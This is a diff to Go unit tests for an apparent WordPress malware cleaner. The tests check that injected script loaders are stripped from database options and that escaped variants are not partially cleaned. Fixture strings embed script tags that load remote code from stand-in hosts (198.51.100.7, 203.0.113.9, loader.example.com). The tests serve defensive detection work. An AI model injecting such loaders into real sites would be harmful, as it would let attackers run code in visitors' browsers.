@@ -34,13 +34,8 @@ func TestEscapedPayloadBlocksPartialAutoClean(t *testing.T) {
 		"ordinary HTTPS notice": fmt.Sprintf(`[%s,"%s"]`, strings.ReplaceAll(escaped, `http:\/\/198.51.100.7`, `https:\/\/loader.example.com`), literal),
 	} {
 		t.Run(name, func(t *testing.T) {
-			previous := runMySQLQuery
 			queries := 0
-			runMySQLQuery = func(_ wpDBCreds, _ string) []string {
-				queries++
-				return nil
-			}
-			t.Cleanup(func() { runMySQLQuery = previous })
+			withOptionExec(t, func(string, []any) (int64, error) { queries++; return 1, nil })
 			if removed := removeMaliciousScripts(value); removed == value || !strings.Contains(removed, `<\/script>`) {
 				t.Fatal("fixture must remove the literal loader and leave the escaped bytes intact")
 			}
@@ -59,6 +54,7 @@ func TestDBCleanOptionRefusesPartialNoticeCleanup(t *testing.T) {
 	value := `["<script src=http://203.0.113.9/loader.js></script>",` +
 		`{"cdn_setup_err":"<script src=https:\/\/loader.example.com\/speed.js><\/script>"}]`
 	writes := 0
+	withOptionExec(t, func(string, []any) (int64, error) { writes++; return 1, nil })
 	mysqlclient.SetPerAccountQueryForTest(func(_ context.Context, _ mysqlclient.Creds, query string, _ ...any) ([]string, error) {
 		if strings.HasPrefix(query, "SELECT option_value") {
 			return []string{strings.ReplaceAll(value, `\`, `\\`)}, nil
@@ -108,15 +104,8 @@ func TestPostScriptScanSeesJSONEscapedSlashes(t *testing.T) {
 // than persisting a value that still carries the loader.
 func TestEscapedPayloadIsNotAutoCleaned(t *testing.T) {
 	value := `{"cdn_setup_err":"<script src=http:\/\/198.51.100.7\/speed.js><\/script>"}`
-	previous := runMySQLQuery
 	var wrote bool
-	runMySQLQuery = func(_ wpDBCreds, query string) []string {
-		if strings.HasPrefix(query, "UPDATE") || strings.HasPrefix(query, "INSERT") {
-			wrote = true
-		}
-		return nil
-	}
-	t.Cleanup(func() { runMySQLQuery = previous })
+	withOptionExec(t, func(string, []any) (int64, error) { wrote = true; return 1, nil })
 
 	cleaned := backupAndCleanOption(wpDBCreds{dbName: "alice_wp"}, "wp_", "litespeed.cdn_setup._summary", value, "http://198.51.100.7/speed.js")
 
